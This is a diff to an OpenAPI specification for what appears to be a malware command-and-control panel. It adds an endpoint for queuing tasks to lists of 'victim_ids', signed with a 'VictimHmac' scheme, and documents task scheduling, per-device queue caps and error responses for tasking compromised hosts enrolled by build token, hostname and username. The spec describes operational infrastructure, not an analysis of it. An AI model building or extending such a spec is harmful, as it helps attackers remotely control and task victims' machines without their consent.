@@ -19,6 +19,7 @@ components:
         error: {type: string}
         message: {type: string}
         retry_after: {type: integer, minimum: 0}
+        victim_ids: {type: array, items: {type: string, format: uuid}}
     EnrollRequest:
       type: object
       required: [build_token, build_id, hostname, os, arch, username, agent_version, profile]
@@ -62,10 +63,14 @@ components:
         name: {type: string}
         params: {type: object}
         timeout_sec: {type: integer, minimum: 1, maximum: 3600}
-        not_before: {type: integer}
+        not_before: {type: integer, description: 'Epoch seconds. A future value stays queued: FIFO, 32 per device, four at a time, one more after each result. Waited >1 h past the slot → expired, never run.'}
     TaskResult:
       type: object
       required: [status, result]
+      description: >
+        Consumers read `status` first. On `error:"timeout"` the result is `{}` and
+        artifacts is `[]`; on `unknown` the panel gave up waiting and the task is
+        terminal. A duplicate final body returns 409 already_finished.
       properties:
         status: {type: string, enum: [ok, error, cancelled]}
         error: {type: [string, "null"]}
@@ -157,8 +162,47 @@ paths:
         "401": {description: bad_signature}
         "410": {description: revoked}
   /tasks:
+    post:
+      description: >
+        Console enqueue. A due task needs a live control socket: without one the
+        answer is `409 agent_offline` with `victim_ids`, no queue. A future
+        `not_before` is scheduled instead; at 32 queued per device the answer is
+        `409 queue_full`. Out-of-range params are `422 invalid_params` with the
+        range in the message.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [victim_ids, name]
+              properties:
+                victim_ids: {type: array, items: {type: string, format: uuid}}
+                name: {type: string}
+                params: {type: object}
+                priority: {type: integer}
+                timeout_sec: {type: integer}
+                not_before: {type: string, format: date-time}
+      responses:
+        "201":
+          description: Created and dispatched, or scheduled
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  items: {type: array, items: {type: object, properties: {id: {type: string, format: uuid}, victimId: {type: string, format: uuid}}}}
+        "409":
+          description: agent_offline (no control socket) or queue_full (32 scheduled)
+          content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}
+        "422": {description: invalid_params or no_victims}
     get:
       security: [{VictimHmac: []}]
+      description: >
+        Leases queued work. Scheduled tasks (`not_before`) are handed out FIFO,
+        four at a time, chaining one more per result; the queue is capped at 32
+        per device and a task more than 1 h past its slot is `expired` instead of
+        leased. `unknown` is terminal and is never returned.
       parameters:
         - {name: limit, in: query, schema: {type: integer, minimum: 1, maximum: 32}}
       responses:
